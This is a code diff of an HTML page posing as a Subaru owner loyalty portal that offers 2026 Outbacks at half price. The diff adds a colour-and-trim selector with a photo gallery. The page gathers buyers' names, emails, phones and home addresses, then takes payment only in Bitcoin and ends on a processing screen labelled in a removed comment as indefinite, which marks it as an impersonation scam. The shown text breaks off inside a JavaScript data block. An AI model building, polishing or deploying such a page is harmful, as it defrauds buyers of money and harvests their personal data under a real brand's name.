@@ -3,19 +3,81 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Subaru Corporate Owner Loyalty Portal | 2026 Outback</title>
+  <title>Subaru Corporate Owner Loyalty Portal | 2026 Outback Collection</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
     @keyframes slide {
       0% { transform: translateX(-100%); }
       100% { transform: translateX(400%); }
     }
+    .car-card {
+      transition: all 0.3s ease;
+    }
+    .car-card:hover {
+      transform: translateY(-4px);
+    }
+    .car-card.selected {
+      border-color: #2563eb;
+      background: linear-gradient(135deg, #eff6ff 0%, #dbeafe 100%);
+      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.3);
+    }
+    .car-selector {
+      display: flex;
+      gap: 0.75rem;
+      overflow-x: auto;
+      padding-bottom: 1rem;
+    }
+    .color-dot {
+      width: 14px;
+      height: 14px;
+      border-radius: 50%;
+      display: inline-block;
+      border: 2px solid white;
+      box-shadow: 0 0 0 1px #cbd5e1;
+    }
+    .spec-badge {
+      display: inline-block;
+      padding: 2px 8px;
+      border-radius: 12px;
+      font-size: 10px;
+      font-weight: 700;
+      text-transform: uppercase;
+    }
+    .spec-row:nth-child(even) {
+      background-color: #f8fafc;
+    }
+    .gallery-thumb {
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+    .gallery-thumb:hover {
+      opacity: 0.8;
+    }
+    .gallery-thumb.active {
+      border-color: #2563eb;
+      opacity: 1;
+    }
+    .nav-arrow {
+      cursor: pointer;
+      background: rgba(0,0,0,0.5);
+      color: white;
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      font-size: 18px;
+      transition: all 0.2s;
+    }
+    .nav-arrow:hover {
+      background: rgba(0,0,0,0.8);
+    }
   </style>
 </head>
 <body class="bg-gray-900 text-gray-800 font-sans antialiased min-h-screen flex items-center justify-center p-4">
 
-  <!-- POPUP 1: RESERVATION & PAYMENT SELECTION -->
-  <div id="popup-1" class="bg-white rounded-xl shadow-2xl overflow-hidden border border-gray-200 w-full max-w-5xl">
+  <div id="popup-1" class="bg-white rounded-xl shadow-2xl overflow-hidden border border-gray-200 w-full max-w-6xl">
     
     <div class="bg-black text-white py-4 px-6 flex justify-between items-center">
       <div class="flex items-center space-x-3">
@@ -29,175 +91,321 @@
 
     <div class="px-6 py-4 bg-gray-50 border-b">
       <div class="flex items-center justify-between text-xs font-bold text-gray-500 uppercase tracking-wider mb-2">
-        <span class="text-blue-600">1. Reservation</span>
-        <span>2. Payment</span>
-        <span>3. Processing</span>
+        <span class="text-blue-600">1. Select Your Outback</span>
+        <span>2. Reservation</span>
+        <span>3. Payment</span>
+        <span>4. Processing</span>
       </div>
       <div class="w-full bg-gray-200 h-2 rounded-full overflow-hidden">
-        <div class="bg-blue-600 h-full w-1/3 transition-all duration-300"></div>
+        <div class="bg-blue-600 h-full w-1/4 transition-all duration-300"></div>
       </div>
     </div>
 
-    <div class="bg-gradient-to-r from-slate-900 to-blue-900 text-white p-6">
-      <p class="text-blue-400 text-xs font-bold uppercase tracking-widest">Official Owner Incentive</p>
-      <h1 class="text-2xl font-extrabold mt-1">2026 Subaru Outback Premium AWD</h1>
-      <div class="mt-3 inline-flex items-baseline gap-3 bg-white/10 px-3 py-2 rounded-lg backdrop-blur-sm border border-white/20">
-        <span class="text-xs text-gray-300 line-through">MSRP: $34,995.00</span>
-        <span class="text-xl font-black text-green-400">$17,497.50</span>
-        <span class="bg-green-500 text-black text-[10px] font-bold px-2 py-0.5 rounded-full uppercase">50% Off Loyalty Credit</span>
-      </div>
+    <div class="p-6 bg-gradient-to-r from-slate-900 to-blue-900 text-white">
+      <p class="text-blue-400 text-xs font-bold uppercase tracking-widest mb-2">2026 Subaru Outback Collection</p>
+      <h1 class="text-2xl font-extrabold">Choose Your Color</h1>
+      <p class="text-gray-300 text-sm mt-1">9 unique variants • 5 images each • Click thumbnails to view</p>
     </div>
 
-    <div class="p-8 grid md:grid-cols-2 gap-8">
-      <div>
-        <img src="outback.jpg" alt="2026 Subaru Outback" class="rounded-lg shadow-md w-full object-cover h-52">
-        <div class="mt-4 space-y-2 text-xs text-gray-600">
-          <div class="flex justify-between border-b py-1"><span>Drivetrain:</span><span class="font-semibold text-gray-800">Symmetrical AWD</span></div>
-          <div class="flex justify-between border-b py-1"><span>Safety Tech:</span><span class="font-semibold text-gray-800">EyeSight Driver Assist</span></div>
-          <div class="flex justify-between border-b py-1"><span>Fulfillment:</span><span class="font-semibold text-gray-800">Direct Home Delivery</span></div>
+    <div class="p-6">
+      <!-- Car Selector -->
+      <div class="car-selector mb-6" id="carSelector">
+        
+        <!-- Crystal White - Base -->
+        <div class="car-card selected flex-shrink-0 w-52 border-2 border-gray-200 rounded-xl overflow-hidden cursor-pointer bg-white" onclick="selectCar('white')">
+          <div class="relative">
+            <img src="outback-white-1.jpg" alt="2026 Subaru Outback Crystal White Pearl" class="w-full h-28 object-cover" id="thumb-white">
+            <div class="absolute top-2 right-2"><span class="color-dot" style="background: #f8f9fa;"></span></div>
+            <div class="absolute bottom-1 right-1 bg-black/70 text-white text-[10px] px-1.5 py-0.5 rounded">5 pics</div>
+          </div>
+          <div class="p-2.5">
+            <h3 class="font-bold text-xs">Crystal White Pearl</h3>
+            <p class="text-[10px] text-gray-500">Base Model</p>
+            <div class="mt-1 flex gap-1">
+              <span class="spec-badge bg-blue-100 text-blue-700">2.5L</span>
+              <span class="spec-badge bg-green-100 text-green-700">33 MPG</span>
+            </div>
+            <div class="mt-1.5 text-sm font-black text-green-600">$17,498</div>
+          </div>
         </div>
+
+        <!-- Magnetite Gray - Premium -->
+        <div class="car-card flex-shrink-0 w-52 border-2 border-gray-200 rounded-xl overflow-hidden cursor-pointer bg-white" onclick="selectCar('gray')">
+          <div class="relative">
+            <img src="outback-gray-1.jpg" alt="2026 Subaru Outback Magnetite Gray" class="w-full h-28 object-cover" id="thumb-gray">
+            <div class="absolute top-2 right-2"><span class="color-dot" style="background: #4a5568;"></span></div>
+            <div class="absolute bottom-1 right-1 bg-black/70 text-white text-[10px] px-1.5 py-0.5 rounded">5 pics</div>
+          </div>
+          <div class="p-2.5">
+            <h3 class="font-bold text-xs">Magnetite Gray</h3>
+            <p class="text-[10px] text-gray-500">Premium</p>
+            <div class="mt-1 flex gap-1">
+              <span class="spec-badge bg-blue-100 text-blue-700">2.5L</span>
+              <span class="spec-badge bg-purple-100 text-purple-700">Leather</span>
+            </div>
+            <div class="mt-1.5 text-sm font-black text-green-600">$18,748</div>
+          </div>
+        </div>
+
+        <!-- Autumn Green - Wilderness -->
+        <div class="car-card flex-shrink-0 w-52 border-2 border-gray-200 rounded-xl overflow-hidden cursor-pointer bg-white" onclick="selectCar('green')">
+          <div class="relative">
+            <img src="outback-green-1.jpg" alt="2026 Subaru Outback Autumn Green" class="w-full h-28 object-cover" id="thumb-green">
+            <div class="absolute top-2 right-2"><span class="color-dot" style="background: #5a6b47;"></span></div>
+            <div class="absolute bottom-1 right-1 bg-black/70 text-white text-[10px] px-1.5 py-0.5 rounded">5 pics</div>
+          </div>
+          <div class="p-2.5">
+            <h3 class="font-bold text-xs">Autumn Green</h3>
+            <p class="text-[10px] text-gray-500">Wilderness</p>
+            <div class="mt-1 flex gap-1">
+              <span class="spec-badge bg-red-100 text-red-700">Turbo</span>
+              <span class="spec-badge bg-orange-100 text-orange-700">260 HP</span>
+            </div>
+            <div class="mt-1.5 text-sm font-black text-green-600">$21,248</div>
+          </div>
+        </div>
+
+        <!-- Wilderness Green - Off-Road -->
+        <div class="car-card flex-shrink-0 w-52 border-2 border-gray-200 rounded-xl overflow-hidden cursor-pointer bg-white" onclick="selectCar('wilderness')">
+          <div class="relative">
+            <img src="outback-wilderness-1.jpg" alt="2026 Subaru Outback Wilderness Green" class="w-full h-28 object-cover" id="thumb-wilderness">
+            <div class="absolute top-2 right-2"><span class="color-dot" style="background: #2d5016;"></span></div>
+            <div class="absolute bottom-1 right-1 bg-black/70 text-white text-[10px] px-1.5 py-0.5 rounded">5 pics</div>
+          </div>
+          <div class="p-2.5">
+            <h3 class="font-bold text-xs">Wilderness Green</h3>
+            <p class="text-[10px] text-gray-500">Off-Road</p>
+            <div class="mt-1 flex gap-1">
+              <span class="spec-badge bg-red-100 text-red-700">Turbo</span>
+              <span class="spec-badge bg-orange-100 text-orange-700">9.5"</span>
+            </div>
+            <div class="mt-1.5 text-sm font-black text-green-600">$22,998</div>
+          </div>
+        </div>
+
+        <!-- Brilliant Bronze - Touring XT -->
+        <div class="car-card flex-shrink-0 w-52 border-2 border-gray-200 rounded-xl overflow-hidden cursor-pointer bg-white" onclick="selectCar('bronze')">
+          <div class="relative">
+            <img src="outback-bronze-1.jpg" alt="2026 Subaru Outback Brilliant Bronze" class="w-full h-28 object-cover" id="thumb-bronze">
+            <div class="absolute top-2 right-2"><span class="color-dot" style="background: #8b7355;"></span></div>
+            <div class="absolute bottom-1 right-1 bg-black/70 text-white text-[10px] px-1.5 py-0.5 rounded">5 pics</div>
+          </div>
+          <div class="p-2.5">
+            <h3 class="font-bold text-xs">Brilliant Bronze</h3>
+            <p class="text-[10px] text-gray-500">Touring XT</p>
+            <div class="mt-1 flex gap-1">
+              <span class="spec-badge bg-red-100 text-red-700">Turbo</span>
+              <span class="spec-badge bg-purple-100 text-purple-700">Luxury</span>
+            </div>
+            <div class="mt-1.5 text-sm font-black text-green-600">$22,498</div>
+          </div>
+        </div>
+
+        <!-- Cascade Green - Onyx -->
+        <div class="car-card flex-shrink-0 w-52 border-2 border-gray-200 rounded-xl overflow-hidden cursor-pointer bg-white" onclick="selectCar('cascade')">
+          <div class="relative">
+            <img src="outback-cascade-1.jpg" alt="2026 Subaru Outback Cascade Green" class="w-full h-28 object-cover" id="thumb-cascade">
+            <div class="absolute top-2 right-2"><span class="color-dot" style="background: #4a6741;"></span></div>
+            <div class="absolute bottom-1 right-1 bg-black/70 text-white text-[10px] px-1.5 py-0.5 rounded">5 pics</div>
+          </div>
+          <div class="p-2.5">
+            <h3 class="font-bold text-xs">Cascade Green</h3>
+            <p class="text-[10px] text-gray-500">Onyx Edition</p>
+            <div class="mt-1 flex gap-1">
+              <span class="spec-badge bg-gray-800 text-white">Sport</span>
+              <span class="spec-badge bg-blue-100 text-blue-700">X-Mode</span>
+            </div>
+            <div class="mt-1.5 text-sm font-black text-green-600">$18,748</div>
+          </div>
+        </div>
+
+        <!-- Crimson Red - Touring -->
+        <div class="car-card flex-shrink-0 w-52 border-2 border-gray-200 rounded-xl overflow-hidden cursor-pointer bg-white" onclick="selectCar('red')">
+          <div class="relative">
+            <img src="outback-red-1.jpg" alt="2026 Subaru Outback Crimson Red" class="w-full h-28 object-cover" id="thumb-red">
+            <div class="absolute top-2 right-2"><span class="color-dot" style="background: #c53030;"></span></div>
+            <div class="absolute bottom-1 right-1 bg-black/70 text-white text-[10px] px-1.5 py-0.5 rounded">5 pics</div>
+          </div>
+          <div class="p-2.5">
+            <h3 class="font-bold text-xs">Crimson Red Pearl</h3>
+            <p class="text-[10px] text-gray-500">Touring</p>
+            <div class="mt-1 flex gap-1">
+              <span class="spec-badge bg-blue-100 text-blue-700">2.5L</span>
+              <span class="spec-badge bg-purple-100 text-purple-700">Premium</span>
+            </div>
+            <div class="mt-1.5 text-sm font-black text-green-600">$20,498</div>
+          </div>
+        </div>
+
+        <!-- Midnight Blue - Limited XT -->
+        <div class="car-card flex-shrink-0 w-52 border-2 border-gray-200 rounded-xl overflow-hidden cursor-pointer bg-white" onclick="selectCar('blue')">
+          <div class="relative">
+            <img src="outback-blue-1.jpg" alt="2026 Subaru Outback Midnight Blue" class="w-full h-28 object-cover" id="thumb-blue">
+            <div class="absolute top-2 right-2"><span class="color-dot" style="background: #1a365d;"></span></div>
+            <div class="absolute bottom-1 right-1 bg-black/70 text-white text-[10px] px-1.5 py-0.5 rounded">5 pics</div>
+          </div>
+          <div class="p-2.5">
+            <h3 class="font-bold text-xs">Midnight Blue</h3>
+            <p class="text-[10px] text-gray-500">Limited XT</p>
+            <div class="mt-1 flex gap-1">
+              <span class="spec-badge bg-red-100 text-red-700">Turbo</span>
+              <span class="spec-badge bg-indigo-100 text-indigo-700">Tech</span>
+            </div>
+            <div class="mt-1.5 text-sm font-black text-green-600">$21,748</div>
+          </div>
+        </div>
+
+        <!-- Tungsten - Winter Package -->
+        <div class="car-card flex-shrink-0 w-52 border-2 border-gray-200 rounded-xl overflow-hidden cursor-pointer bg-white" onclick="selectCar('tungsten')">
+          <div class="relative">
+            <img src="outback-tungsten-1.jpg" alt="2026 Subaru Outback Tungsten" class="w-full h-28 object-cover" id="thumb-tungsten">
+            <div class="absolute top-2 right-2"><span class="color-dot" style="background: #718096;"></span></div>
+            <div class="absolute bottom-1 right-1 bg-black/70 text-white text-[10px] px-1.5 py-0.5 rounded">5 pics</div>
+          </div>
+          <div class="p-2.5">
+            <h3 class="font-bold text-xs">Tungsten Metallic</h3>
+            <p class="text-[10px] text-gray-500">Winter Pkg</p>
+            <div class="mt-1 flex gap-1">
+              <span class="spec-badge bg-blue-100 text-blue-700">2.5L</span>
+              <span class="spec-badge bg-cyan-100 text-cyan-700">AWD+</span>
+            </div>
+            <div class="mt-1.5 text-sm font-black text-green-600">$19,248</div>
+          </div>
+        </div>
+
       </div>
 
-      <div class="space-y-4">
-        <h2 class="text-lg font-bold text-gray-900">1. Reservation Details</h2>
-
-        <label id="card-option1" onclick="selectOption(1)" class="block border-2 border-blue-600 bg-blue-50/50 p-3.5 rounded-xl cursor-pointer transition-all">
-          <div class="flex items-start justify-between">
-            <div>
-              <span class="font-bold text-blue-900 block text-sm">Option 1: Pay 100% Upfront</span>
-              <span class="text-xs text-gray-500">Zero monthly bills or interest</span>
-            </div>
-            <span class="font-extrabold text-blue-900 text-base">$17,497.50</span>
-          </div>
-          <div class="mt-1 text-xs font-semibold text-green-700">$0 / month forever</div>
-        </label>
-
-        <label id="card-option2" onclick="selectOption(2)" class="block border-2 border-gray-200 p-3.5 rounded-xl cursor-pointer transition-all hover:border-gray-300">
-          <div class="flex items-start justify-between">
-            <div>
-              <span class="font-bold text-gray-900 block text-sm">Option 2: Pay 50% Upfront</span>
-              <span class="text-xs text-gray-500">Finance balance over 72 mos @ 3.9%</span>
-            </div>
-            <span class="font-extrabold text-gray-900 text-base">$8,748.75</span>
-          </div>
-          <div class="mt-1 text-xs font-semibold text-blue-600">~$136 / month remaining</div>
-        </label>
-
-        <form onsubmit="showPopup2(event)" class="space-y-3 pt-2">
-          <div class="grid grid-cols-2 gap-3">
-            <div>
-              <label class="block text-xs font-bold text-gray-600 mb-1">First Name</label>
-              <input type="text" id="cust-firstname" required class="w-full border p-2 rounded text-sm outline-none focus:border-blue-600" placeholder="John">
-            </div>
-            <div>
-              <label class="block text-xs font-bold text-gray-600 mb-1">Last Name</label>
-              <input type="text" id="cust-lastname" required class="w-full border p-2 rounded text-sm outline-none focus:border-blue-600" placeholder="Doe">
+      <!-- Selected Car Details with Gallery -->
+      <div class="grid md:grid-cols-2 gap-8" id="carDetails">
+        <div>
+          <!-- Main Image with Navigation -->
+          <div class="relative">
+            <img id="selectedCarImage" src="outback-white-1.jpg" alt="Selected 2026 Subaru Outback" class="rounded-lg shadow-md w-full object-cover h-56">
+            
+            <!-- Navigation Arrows -->
+            <div class="absolute top-1/2 left-2 transform -translate-y-1/2 nav-arrow" onclick="prevImage()">‹</div>
+            <div class="absolute top-1/2 right-2 transform -translate-y-1/2 nav-arrow" onclick="nextImage()">›</div>
+            
+            <!-- Image Counter -->
+            <div class="absolute bottom-2 right-2 bg-black/70 text-white text-xs px-2 py-1 rounded">
+              <span id="currentImageIndex">1</span> / 5
             </div>
           </div>
+          
+          <!-- Thumbnail Gallery -->
+          <div class="mt-3 grid grid-cols-5 gap-2" id="imageGallery">
+            <!-- Populated by JavaScript -->
+          </div>
+          
+          <!-- Specs Table -->
+          <div class="mt-4 border rounded-xl overflow-hidden">
+            <div class="bg-gradient-to-r from-blue-900 to-slate-900 text-white px-4 py-3 border-b flex justify-between items-center">
+              <h4 class="font-bold text-sm">2026 Subaru Outback Specifications</h4>
+              <span id="specsColorBadge" class="text-xs bg-white/20 px-2 py-1 rounded">Crystal White Pearl</span>
+            </div>
+            <div class="text-xs text-gray-600" id="carSpecs">
+              <!-- Populated by JavaScript -->
+            </div>
+          </div>
+        </div>
 
-          <div>
-            <label class="block text-xs font-bold text-gray-600 mb-1">Email Address</label>
-            <input type="email" id="cust-email" required class="w-full border p-2 rounded text-sm outline-none focus:border-blue-600" placeholder="john.doe@email.com">
+        <div class="space-y-4">
+          <div class="bg-gradient-to-r from-slate-900 to-blue-900 text-white p-4 rounded-xl">
+            <p class="text-blue-400 text-xs font-bold uppercase tracking-widest">Selected Configuration</p>
+            <h2 class="text-xl font-extrabold mt-1">2026 Subaru Outback</h2>
+            <p id="selectedCarColor" class="text-gray-300 text-sm">Crystal White Pearl</p>
+            <div class="mt-3 inline-flex items-baseline gap-3 bg-white/10 px-3 py-2 rounded-lg backdrop-blur-sm border border-white/20">
+              <span class="text-xs text-gray-300 line-through" id="selectedCarMSRP">MSRP: $34,995.00</span>
+              <span class="text-2xl font-black text-green-400" id="selectedCarPrice">$17,497.50</span>
+              <span class="bg-green-500 text-black text-[10px] font-bold px-2 py-0.5 rounded-full uppercase">50% Off</span>
+            </div>
           </div>
 
-          <div>
-            <label class="block text-xs font-bold text-gray-600 mb-1">Phone Number</label>
-            <input type="tel" id="cust-phone" required class="w-full border p-2 rounded text-sm outline-none focus:border-blue-600" placeholder="(555) 123-4567">
-          </div>
+          <h2 class="text-lg font-bold text-gray-900">2. Reservation Details</h2>
 
-          <div class="bg-gray-50 p-3 rounded-lg border border-gray-200">
-            <h3 class="text-xs font-bold text-gray-700 mb-2 uppercase">Delivery Address</h3>
-            <div class="space-y-2">
+          <label id="card-option1" onclick="selectPaymentOption(1)" class="block border-2 border-blue-600 bg-blue-50/50 p-3.5 rounded-xl cursor-pointer transition-all">
+            <div class="flex items-start justify-between">
               <div>
-                <label class="block text-xs font-bold text-gray-600 mb-1">Street Address</label>
-                <input type="text" id="cust-street" required class="w-full border p-2 rounded text-sm outline-none focus:border-blue-600" placeholder="123 Main Street">
+                <span class="font-bold text-blue-900 block text-sm">Option 1: Pay 100% Upfront</span>
+                <span class="text-xs text-gray-500">Zero monthly bills or interest</span>
               </div>
+              <span class="font-extrabold text-blue-900 text-base" id="option1Price">$17,497.50</span>
+            </div>
+            <div class="mt-1 text-xs font-semibold text-green-700">$0 / month forever</div>
+          </label>
 
-              <div class="grid grid-cols-3 gap-2">
+          <label id="card-option2" onclick="selectPaymentOption(2)" class="block border-2 border-gray-200 p-3.5 rounded-xl cursor-pointer transition-all hover:border-gray-300">
+            <div class="flex items-start justify-between">
+              <div>
+                <span class="font-bold text-gray-900 block text-sm">Option 2: Pay 50% Upfront</span>
+                <span class="text-xs text-gray-500">Finance balance over 72 mos @ 3.9%</span>
+              </div>
+              <span class="font-extrabold text-gray-900 text-base" id="option2Price">$8,748.75</span>
+            </div>
+            <div class="mt-1 text-xs font-semibold text-blue-600" id="monthlyPayment">~$136 / month remaining</div>
+          </label>
+
+          <form onsubmit="showPopup2(event)" class="space-y-3 pt-2">
+            <div class="grid grid-cols-2 gap-3">
+              <div>
+                <label class="block text-xs font-bold text-gray-600 mb-1">First Name</label>
+                <input type="text" id="cust-firstname" required class="w-full border p-2 rounded text-sm outline-none focus:border-blue-600" placeholder="John">
+              </div>
+              <div>
+                <label class="block text-xs font-bold text-gray-600 mb-1">Last Name</label>
+                <input type="text" id="cust-lastname" required class="w-full border p-2 rounded text-sm outline-none focus:border-blue-600" placeholder="Doe">
+              </div>
+            </div>
+
+            <div>
+              <label class="block text-xs font-bold text-gray-600 mb-1">Email Address</label>
+              <input type="email" id="cust-email" required class="w-full border p-2 rounded text-sm outline-none focus:border-blue-600" placeholder="john.doe@email.com">
+            </div>
+
+            <div>
+              <label class="block text-xs font-bold text-gray-600 mb-1">Phone Number</label>
+              <input type="tel" id="cust-phone" required class="w-full border p-2 rounded text-sm outline-none focus:border-blue-600" placeholder="(555) 123-4567">
+            </div>
+
+            <div class="bg-gray-50 p-3 rounded-lg border border-gray-200">
+              <h3 class="text-xs font-bold text-gray-700 mb-2 uppercase">Delivery Address</h3>
+              <div class="space-y-2">
                 <div>
-                  <label class="block text-xs font-bold text-gray-600 mb-1">City</label>
-                  <input type="text" id="cust-city" required class="w-full border p-2 rounded text-sm outline-none focus:border-blue-600" placeholder="Los Angeles">
+                  <label class="block text-xs font-bold text-gray-600 mb-1">Street Address</label>
+                  <input type="text" id="cust-street" required class="w-full border p-2 rounded text-sm outline-none focus:border-blue-600" placeholder="123 Main Street">
                 </div>
-                <div>
-                  <label class="block text-xs font-bold text-gray-600 mb-1">State</label>
-                  <input type="text" list="states-list" id="cust-state" required class="w-full border p-2 rounded text-sm outline-none focus:border-blue-600" placeholder="Type to search...">
-                  <datalist id="states-list">
-                    <option value="AL">Alabama</option>
-                    <option value="AK">Alaska</option>
-                    <option value="AZ">Arizona</option>
-                    <option value="AR">Arkansas</option>
-                    <option value="CA">California</option>
-                    <option value="CO">Colorado</option>
-                    <option value="CT">Connecticut</option>
-                    <option value="DE">Delaware</option>
-                    <option value="DC">District of Columbia</option>
-                    <option value="FL">Florida</option>
-                    <option value="GA">Georgia</option>
-                    <option value="HI">Hawaii</option>
-                    <option value="ID">Idaho</option>
-                    <option value="IL">Illinois</option>
-                    <option value="IN">Indiana</option>
-                    <option value="IA">Iowa</option>
-                    <option value="KS">Kansas</option>
-                    <option value="KY">Kentucky</option>
-                    <option value="LA">Louisiana</option>
-                    <option value="ME">Maine</option>
-                    <option value="MD">Maryland</option>
-                    <option value="MA">Massachusetts</option>
-                    <option value="MI">Michigan</option>
-                    <option value="MN">Minnesota</option>
-                    <option value="MS">Mississippi</option>
-                    <option value="MO">Missouri</option>
-                    <option value="MT">Montana</option>
-                    <option value="NE">Nebraska</option>
-                    <option value="NV">Nevada</option>
-                    <option value="NH">New Hampshire</option>
-                    <option value="NJ">New Jersey</option>
-                    <option value="NM">New Mexico</option>
-                    <option value="NY">New York</option>
-                    <option value="NC">North Carolina</option>
-                    <option value="ND">North Dakota</option>
-                    <option value="OH">Ohio</option>
-                    <option value="OK">Oklahoma</option>
-                    <option value="OR">Oregon</option>
-                    <option value="PA">Pennsylvania</option>
-                    <option value="RI">Rhode Island</option>
-                    <option value="SC">South Carolina</option>
-                    <option value="SD">South Dakota</option>
-                    <option value="TN">Tennessee</option>
-                    <option value="TX">Texas</option>
-                    <option value="UT">Utah</option>
-                    <option value="VT">Vermont</option>
-                    <option value="VA">Virginia</option>
-                    <option value="WA">Washington</option>
-                    <option value="WV">West Virginia</option>
-                    <option value="WI">Wisconsin</option>
-                    <option value="WY">Wyoming</option>
-                    <option value="Other">Other (Outside US)</option>
-                  </datalist>
-                </div>
-                <div>
-                  <label class="block text-xs font-bold text-gray-600 mb-1">ZIP Code</label>
-                  <input type="text" id="cust-zip" required class="w-full border p-2 rounded text-sm outline-none focus:border-blue-600" placeholder="90210" maxlength="10">
+                <div class="grid grid-cols-3 gap-2">
+                  <div>
+                    <label class="block text-xs font-bold text-gray-600 mb-1">City</label>
+                    <input type="text" id="cust-city" required class="w-full border p-2 rounded text-sm outline-none focus:border-blue-600" placeholder="Los Angeles">
+                  </div>
+                  <div>
+                    <label class="block text-xs font-bold text-gray-600 mb-1">State</label>
+                    <input type="text" id="cust-state" required class="w-full border p-2 rounded text-sm outline-none focus:border-blue-600" placeholder="CA">
+                  </div>
+                  <div>
+                    <label class="block text-xs font-bold text-gray-600 mb-1">ZIP Code</label>
+                    <input type="text" id="cust-zip" required class="w-full border p-2 rounded text-sm outline-none focus:border-blue-600" placeholder="90210" maxlength="10">
+                  </div>
                 </div>
               </div>
             </div>
-          </div>
 
-          <div>
-            <label class="block text-xs font-bold text-gray-600 mb-1">Preferred Delivery Date</label>
-            <input type="date" id="cust-date" required class="w-full border p-2 rounded text-sm outline-none focus:border-blue-600">
-          </div>
+            <div>
+              <label class="block text-xs font-bold text-gray-600 mb-1">Preferred Delivery Date</label>
+              <input type="date" id="cust-date" required class="w-full border p-2 rounded text-sm outline-none focus:border-blue-600">
+            </div>
 
-          <div class="flex items-start gap-2 pt-2">
-            <input type="checkbox" id="cust-terms" required class="mt-0.5">
-            <label for="cust-terms" class="text-xs text-gray-600">I confirm I am a registered Subaru owner and agree to the Corporate Loyalty Program terms.</label>
-          </div>
+            <div class="flex items-start gap-2 pt-2">
+              <input type="checkbox" id="cust-terms" required class="mt-0.5">
+              <label for="cust-terms" class="text-xs text-gray-600">I confirm I am a registered Subaru owner and agree to the Corporate Loyalty Program terms.</label>
+            </div>
 
-          <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl shadow transition-all text-sm">
-            Proceed to Bitcoin Payment →
-          </button>
-        </form>
+            <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl shadow transition-all text-sm">
+              Proceed to Bitcoin Payment →
+            </button>
+          </form>
+        </div>
       </div>
     </div>
 
@@ -208,7 +416,6 @@
 
   <!-- POPUP 2: BITCOIN PAYMENT -->
   <div id="popup-2" class="hidden bg-white rounded-xl shadow-2xl overflow-hidden border border-gray-200 w-full max-w-2xl">
-    
     <div class="bg-black text-white py-4 px-6 flex justify-between items-center">
       <div class="flex items-center space-x-3">
         <img src="subaru-logo.png" alt="Subaru Logo" class="h-8 object-contain">
@@ -219,26 +426,41 @@
 
     <div class="px-6 py-4 bg-gray-50 border-b">
       <div class="flex items-center justify-between text-xs font-bold text-gray-500 uppercase tracking-wider mb-2">
-        <span class="text-green-600">1. Reservation</span>
-        <span class="text-blue-600">2. Payment</span>
-        <span>3. Processing</span>
+        <span class="text-green-600">1. Select Vehicle</span>
+        <span class="text-green-600">2. Reservation</span>
+        <span class="text-blue-600">3. Payment</span>
+        <span>4. Processing</span>
       </div>
       <div class="w-full bg-gray-200 h-2 rounded-full overflow-hidden">
-        <div class="bg-blue-600 h-full w-2/3 transition-all duration-300"></div>
+        <div class="bg-blue-600 h-full w-3/4 transition-all duration-300"></div>
       </div>
     </div>
 
     <div class="p-6 space-y-4">
-      <h2 class="text-xl font-bold text-gray-900 text-center">2. Complete Bitcoin Payment</h2>
+      <h2 class="text-xl font-bold text-gray-900 text-center">3. Complete Bitcoin Payment</h2>
       
-      <div class="bg-gray-50 border p-4 rounded-xl flex justify-between items-center text-sm">
-        <div>
-          <span class="block text-xs text-gray-500 uppercase font-bold">Selected Plan</span>
-          <span id="summary-plan" class="font-bold text-gray-800">100% Upfront</span>
+      <div class="bg-gray-50 border p-4 rounded-xl">
+        <div class="flex justify-between items-center text-sm mb-2">
+          <span class="text-gray-500">Vehicle:</span>
+          <span class="font-bold text-gray-800">2026 Subaru Outback</span>
         </div>
-        <div class="text-right">
-          <span class="block text-xs text-gray-500 uppercase font-bold">Due Today</span>
-          <span id="summary-amount" class="text-xl font-black text-blue-600">$17,497.50</span>
+        <div class="flex justify-between items-center text-sm mb-2">
+          <span class="text-gray-500">Color:</span>
+          <span id="payment-car-color" class="font-bold text-gray-800">Crystal White Pearl</span>
+        </div>
+        <div class="flex justify-between items-center text-sm mb-2">
+          <span class="text-gray-500">Configuration:</span>
+          <span id="payment-car-config" class="font-bold text-gray-800">Base Model</span>
+        </div>
+        <div class="flex justify-between items-center text-sm border-t pt-2">
+          <div>
+            <span class="block text-xs text-gray-500 uppercase font-bold">Payment Plan</span>
+            <span id="summary-plan" class="font-bold text-gray-800">100% Upfront</span>
+          </div>
+          <div class="text-right">
+            <span class="block text-xs text-gray-500 uppercase font-bold">Due Today</span>
+            <span id="summary-amount" class="text-xl font-black text-blue-600">$17,497.50</span>
+          </div>
         </div>
       </div>
 
@@ -315,9 +537,8 @@
     </div>
   </div>
 
-  <!-- POPUP 3: TRANSACTION PROCESSING (INDEFINITE) -->
+  <!-- POPUP 3: TRANSACTION PROCESSING -->
   <div id="popup-3" class="hidden bg-white rounded-xl shadow-2xl overflow-hidden border border-gray-200 w-full max-w-md text-center p-8">
-    
     <div class="w-16 h-16 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-4">
       <div class="w-8 h-8 border-4 border-yellow-600 border-t-transparent rounded-full animate-spin"></div>
     </div>
@@ -326,6 +547,14 @@
     <p class="text-sm text-gray-500 mb-6">Your Bitcoin payment is being verified on the blockchain</p>
 
     <div class="bg-gray-50 border p-4 rounded-xl text-left text-xs space-y-2 mb-4">
+      <div class="flex justify-between border-b pb-2">
+        <span class="text-gray-500">Vehicle:</span>
+        <span id="processing-car" class="font-bold text-gray-800">2026 Subaru Outback</span>
+      </div>
+      <div class="flex justify-between border-b pb-2">
+        <span class="text-gray-500">Color:</span>
+        <span id="processing-color" class="font-bold text-gray-800">Crystal White Pearl</span>
+      </div>
       <div class="flex justify-between border-b pb-2">
         <span class="text-gray-500">Status:</span>
         <span class="font-bold text-yellow-600 animate-pulse">● Confirming</span>
@@ -363,13 +592,390 @@
   </div>
 
   <script>
-    let selectedAmount = 17497.50;
+    // Car data with 5 images per variant
+    const carData = {
+      white: {
+        name: "Crystal White Pearl",
+        config: "Base Model",
+        images: [
+          "outback-white-1.jpg",  // Front 3/4 view
+          "outback-white-2.jpg",  // Side profile
+          "outback-white-3.jpg",  // Rear angle
+          "outback-white-4.jpg",  // Interior/dashboard
+          "outback-white-5.jpg"   // Detail/wheels
+        ],
+        msrp: 34995,
+        price: 17497.50,
+        monthly: 136,
+        specs: {
